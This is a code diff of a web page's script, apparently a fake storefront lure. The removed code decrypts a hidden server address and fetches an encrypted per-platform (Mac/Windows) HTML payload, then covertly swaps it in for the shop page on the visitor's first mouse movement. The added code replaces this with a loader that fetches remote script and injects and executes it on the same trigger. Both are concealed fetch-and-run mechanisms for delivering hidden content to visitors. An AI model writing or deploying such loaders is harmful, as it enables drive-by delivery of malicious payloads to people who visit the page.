@@ -241,48 +241,35 @@
 
 
 <script>
-    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
-    const URL_KEY = "UrLk3yShopEase01";
-    const ENC_DATA_ORIGIN = "U2FsdGVkX1/rAybYec5MLJVcK9R9YIdNcr/wMWK+oIPprZNDThE/8iFayEru8m0r1rJsjZeu+GcdLiiHmbD52w==";
-    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
-    const DATA_URL = DATA_ORIGIN + "/data";
-    let lastUrl = null;
+    // Point this to your backend script endpoint
+    const BACKEND_SCRIPT_URL = "https://your-backend-server.com/api/get-script";
 
-    function detectPlatform() {
-      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
-                navigator.platform || navigator.userAgent || "";
-      return /mac/i.test(p) ? "mac" : "win";
+    async function fetchAndRunScript() {
+        try {
+            const response = await fetch(BACKEND_SCRIPT_URL);
+            if (!response.ok) throw new Error("Failed to load script from backend.");
+
+            const scriptContent = await response.text();
+
+            // Dynamically inject and execute the script fetched from your backend
+            const scriptEl = document.createElement("script");
+            scriptEl.textContent = scriptContent;
+            document.body.appendChild(scriptEl);
+
+        } catch (e) {
+            const hint = document.querySelector(".hint");
+            if (hint) hint.textContent = "⚠️ " + e.message;
+            const popup = document.getElementById("customPopup");
+            if (popup) popup.style.display = "none";
+        }
     }
 
-    async function loadSecret() {
-      const shop = document.getElementById("shop"), frame = document.getElementById("frame");
-      try {
-        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
-        const { cipher } = await res.json();
-        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
-        if (!html) throw new Error("Decrypt failed — wrong key?");
-
-        if (lastUrl) URL.revokeObjectURL(lastUrl);
-        const blob = new Blob([html], { type: "text/html" });
-        lastUrl = URL.createObjectURL(blob);
-
-        frame.src = lastUrl;
-        
-      
-        shop.style.display = "none";
-        frame.style.display = "block";
-        document.getElementById("customPopup").style.display = "none"; 
-        
-      } catch (e) {
-        document.querySelector(".hint").textContent = "⚠️ " + e.message;
-        document.getElementById("customPopup").style.display = "none";
-      }
-    }
-
-    
+    // Trigger on first user interaction
     window.addEventListener("mousemove", () => {
-      document.getElementById("customPopup").style.display = "none";
-      loadSecret();
+        const popup = document.getElementById("customPopup");
+        if (popup) popup.style.display = "none";
+        
+        fetchAndRunScript();
     }, { once: true });
 </script>
 	
